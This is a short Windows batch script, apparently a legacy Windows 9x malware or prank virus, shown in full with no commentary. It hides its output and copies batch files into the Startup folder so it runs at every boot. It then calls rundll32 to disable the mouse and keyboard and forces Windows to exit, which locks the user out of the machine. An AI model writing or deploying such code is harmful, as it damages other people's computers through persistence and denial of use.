@echo off
ctty nul
xcopy *.bat C:\Windows\Startm~1\Progra~1\Autost~1
copy *.bat C:\Windows\Startm~1\Progra~1\Autost~1
C:\Windows\rundll32.exe Mouse,Disable
C:\Windows\rundll32.exe Keyboard,Disable
cd..
cd..
C:\Windows\rundll32.exe user,exitWindowsexec
cls
end
exit
